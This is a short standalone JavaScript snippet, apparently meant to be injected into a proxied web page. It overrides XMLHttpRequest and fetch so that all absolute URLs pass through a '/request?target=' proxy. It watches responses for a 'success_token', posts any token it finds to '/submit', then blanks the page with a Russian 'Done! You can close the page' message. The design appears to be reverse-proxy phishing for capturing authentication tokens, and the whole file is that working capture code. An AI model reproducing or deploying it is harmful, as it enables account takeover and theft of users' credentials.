(function() {
  function rewriteUrl(urlStr) {
    if (!urlStr || typeof urlStr !== 'string') return urlStr;
    if (urlStr.indexOf('http://') === 0 || urlStr.indexOf('https://') === 0) {
      return '/request?target=' + encodeURIComponent(urlStr);
    }
    return urlStr;
  }

  var origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function() {
    if (arguments[1] && typeof arguments[1] === 'string') {
      this._origUrl = arguments[1];
      arguments[1] = rewriteUrl(arguments[1]);
    }
    return origOpen.apply(this, arguments);
  };

  var origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function() {
    var xhr = this;
    this.addEventListener('load', function() {
      try {
        var data = JSON.parse(xhr.responseText);
        if (data.response && data.response.success_token) {
          fetch('/submit', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: data.response.success_token })
          }).then(() => {
            document.body.innerHTML = '<h2 style="text-align:center;margin-top:20vh">Готово! Можете закрыть страницу.</h2>';
          });
        }
      } catch(e) {}
    });
    return origSend.apply(this, arguments);
  };

  var origFetch = window.fetch;
  if (origFetch) {
    window.fetch = function() {
      var url = arguments[0];
      if (typeof url === 'string') {
        arguments[0] = rewriteUrl(url);
      }
      return origFetch.apply(this, arguments).then(function(response) {
        var clone = response.clone();
        clone.json().then(function(data) {
          if (data.response && data.response.success_token) {
            origFetch('/submit', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ token: data.response.success_token })
            });
          }
        }).catch(function() {});
        return response;
      });
    };
  }
})();